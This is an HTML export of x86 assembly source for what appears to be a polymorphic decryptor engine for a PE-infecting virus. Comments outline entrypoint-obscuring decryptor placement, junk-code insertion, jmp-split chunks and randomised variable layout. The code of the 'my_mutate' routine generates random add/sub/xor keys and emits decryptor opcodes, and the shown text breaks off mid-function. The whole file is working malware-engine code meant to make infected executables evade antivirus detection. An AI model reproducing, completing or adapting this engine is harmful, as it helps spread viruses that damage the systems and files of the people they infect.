<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; [.CODE]</span><span class="sc0">

</span><span class="sc1">; somewhere at the entrypoint: (sometimes UEP)</span><span class="sc0">
</span><span class="sc1">;   v1. decryptor itself</span><span class="sc0">
</span><span class="sc1">;   v2. call dword ptr [decr_ptr]</span><span class="sc0">
</span><span class="sc1">;   v3. call near ptr decr</span><span class="sc0">
</span><span class="sc1">;   v4. jmp decr</span><span class="sc0">

</span><span class="sc1">; decryptor:</span><span class="sc0">
</span><span class="sc1">;        mov temp1, reg1   |  push reg1       |   randomly</span><span class="sc0">
</span><span class="sc1">;        mov tempN, regN   |  push regN       |   randomly</span><span class="sc0">
</span><span class="sc1">;        mov index, 0</span><span class="sc0">
</span><span class="sc1">;        key1 = key1_c</span><span class="sc0">
</span><span class="sc1">;        key2 = key2_c                  ; decryptor may contain trash (ETG)</span><span class="sc0">
</span><span class="sc1">; cycle: mov x1, index</span><span class="sc0">
</span><span class="sc1">;        add x1, srcptr                 ; decryptor may be splitted into</span><span class="sc0">
</span><span class="sc1">;        mov t, [x1]                    ; jmp-linked chunks</span><span class="sc0">
</span><span class="sc1">;        cmd1 t, key1</span><span class="sc0">
</span><span class="sc1">;        cmd2 key1, key2                ; &lt;-- all shown commands are</span><span class="sc0">
</span><span class="sc1">;        mov x2, index                  ; high-level macros, which will be</span><span class="sc0">
</span><span class="sc1">;        add x2, dstptr                 ; converted into low-level opcodes</span><span class="sc0">
</span><span class="sc1">;        mov [x2], t                    ; by means of CODEGEN</span><span class="sc0">
</span><span class="sc1">;        add index, var_4</span><span class="sc0">
</span><span class="sc1">;        cmp index, var_virsize</span><span class="sc0">
</span><span class="sc1">;        jb/jl/jne cycle    | setz r8, mov?x r32, r8, jmp [jtab+r32*4]</span><span class="sc0">
</span><span class="sc1">;        call dword ptr [dstptr]            |    call near ptr dst    }---&gt;mixed</span><span class="sc0">
</span><span class="sc1">;        mov regN, tempN    | pop regN                                \__/</span><span class="sc0">
</span><span class="sc1">;        mov reg1, temp1    | pop reg1                                /</span><span class="sc0">

</span><span class="sc1">;             ...</span><span class="sc0">
</span><span class="sc1">;var_4        dd     4                  ; surely, all variables are located</span><span class="sc0">
</span><span class="sc1">;             ...                       ; in the random places</span><span class="sc0">
</span><span class="sc1">;var_virsize  dd     virsize</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; srcptr dd src</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; dstptr dd dst</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; src    db  xx,yy,zz,...       ; virsize bytes</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; key1_c dd  &lt;key1&gt;</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; key2_c dd  &lt;key2&gt;</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">

</span><span class="sc1">; [.DATA]</span><span class="sc0">

</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; dst    db  virsize dup (?)            ; all variables are mixed</span><span class="sc0">
</span><span class="sc1">;        ...                            ; in random order</span><span class="sc0">
</span><span class="sc1">; index  dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; x1     dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; x2     dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; t      dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; temp_1 dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; temp_2 dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; temp_3 dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; key1   dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">; key2   dd  ?</span><span class="sc0">
</span><span class="sc1">;        ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">var_index</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; fixed ID's, to be randomly mixed</span><span class="sc0">
</span><span class="sc5">var_x1</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_x2</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_t</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_temp0</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_temp1</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_temp2</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_temp3</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_temp4</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">9</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ID_dst</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_key1</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">11</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">var_key2</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">num_uninit_vars</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">      </span><span class="sc1">; MAX=32</span><span class="sc0">

</span><span class="sc5">ID_cycle</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">ID_decrstart</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">ID_dd_decrstart</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">var_srcptr</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">var_dstptr</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">ID_src</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">var_4</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">var_virsize</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">var_key1_c</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">var_key2_c</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">22</span><span class="sc0">
</span><span class="sc5">ID_jmpto</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">23</span><span class="sc0">
</span><span class="sc5">ID_jtab</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">ID_jtab_x</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">25</span><span class="sc0">
</span><span class="sc5">ID_link</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">26</span><span class="sc0">

</span><span class="sc5">ID_free</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">27</span><span class="sc0">

</span><span class="sc5">mac1</span><span class="sc0">                    </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">a</span><span class="sc4">,</span><span class="sc5">b</span><span class="sc4">,</span><span class="sc10">c</span><span class="sc4">,</span><span class="sc5">d</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">d</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">b</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">a</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; returns:      0      --if success</span><span class="sc0">
</span><span class="sc1">;            non-zero  --if error</span><span class="sc0">

</span><span class="sc1">;int __cdecl my_mutate(</span><span class="sc0">
</span><span class="sc1">;            DWORD           user_arg,</span><span class="sc0">
</span><span class="sc1">;            PE_HEADER*      pe,</span><span class="sc0">
</span><span class="sc1">;            PE_OBJENTRY*    oe,</span><span class="sc0">
</span><span class="sc1">;            hooy*           root,</span><span class="sc0">
</span><span class="sc1">;            int    __cdecl  user_disasm(DWORD,BYTE*),</span><span class="sc0">
</span><span class="sc1">;            void*  __cdecl  user_malloc(DWORD,DWORD),</span><span class="sc0">
</span><span class="sc1">;            DWORD  __cdecl  user_random(DWORD,DWORD)</span><span class="sc0">
</span><span class="sc1">;            )</span><span class="sc0">

</span><span class="sc5">my_mutate</span><span class="sc0">               </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">

                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">user_param</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">oe</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">root</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">user_disasm</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">user_malloc</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">user_random</span><span class="sc0">

                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">hooy</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">save_esp</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">ret_to</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">buf_size</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">z_cmd1</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">z_key1</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">z_cmd2</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">z_key2</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">regavail</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">etgsize</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">trasher_on</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">calltype</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">d_type</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">d_count</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">d_reg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">:</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">tmp1</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">tmp2</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">last_id</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">jmpprob</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">etg_srcreg</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">etg_cmd</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">etg_maxcmd</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user_param</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.v_saveebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">last_id</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_free</span><span class="sc0">

                        </span><span class="sc1">; disable trash with low prob</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">setnz</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">trasher_on</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; calc jmp-prob</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__do_jmps</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__do_jmps</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">jmpprob</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; 20..40</span><span class="sc0">

                        </span><span class="sc1">; alloc temp-buf</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user_param</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.v_virsize</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_ptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;                       int 3</span><span class="sc0">

                        </span><span class="sc6">nop</span><span class="sc0">
                        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc1">; select encr/decr cmd &amp; key</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; 1=add 2=sub 3=xor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">z_cmd1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_dword</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">z_key1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; 1=add 2=sub 3=xor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">z_cmd2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_dword</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">z_key2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; init vars</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_virsize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user_param</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.v_virsize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key1_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_key1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key2_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_key2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_3</span><span class="sc0">

</span><span class="sc1">; alloc vars</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_srcptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_src</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_dstptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_dst</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_1</span><span class="sc0">

</span><span class="sc1">; alloc uninit vars, in random order</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">num_uninit_vars</span><span class="sc0">
</span><span class="sc5">cc1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">num_uninit_vars</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">cc1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_dst</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cc2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user_param</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.v_virsize</span><span class="sc0">
</span><span class="sc5">cc2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_2</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cc1</span><span class="sc0">

</span><span class="sc1">; CALL decryptor</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_special_hooy</span><span class="sc0">

        </span><span class="sc1">; find entry we must return to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hooy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ret_to</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; with some prob, skip CALL decr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">calltype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">do_decr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">calltype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">call1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">call2</span><span class="sc0">
</span><span class="sc5">call0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; call [dd_decrstart]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">      </span><span class="sc1">; call dword ptr [...]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_fixup</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_dd_decrstart</span><span class="sc0">

</span><span class="sc1">; dd_decrstart</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_dd_decrstart</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_decrstart</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">var_alloc_1</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">callx</span><span class="sc0">
</span><span class="sc5">call1</span><span class="sc4">:</span><span class="sc0">
